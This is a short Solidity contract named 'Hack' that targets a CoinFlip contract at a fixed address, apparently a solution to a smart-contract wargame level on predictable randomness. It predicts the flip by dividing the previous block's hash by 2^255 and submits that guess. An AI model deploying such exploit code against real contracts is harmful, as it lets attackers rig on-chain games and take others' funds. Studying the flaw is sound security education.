// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {CoinFlip} from "./CoinFlip.sol";
import "forge-std/console.sol";

contract  Hack 
{
   CoinFlip public i = CoinFlip(address(0x0dF87ae95D1db29794cA0CfC67DACE89ec9459FF));
   function attack() public
   {
    uint side = uint256(blockhash(block.number - 1));
    side = side/57896044618658097711785492504343953926634992332820282019728792003956564819968;
    bool tf = side == 1 ? true : false;
    i.flip(tf);
   }

}
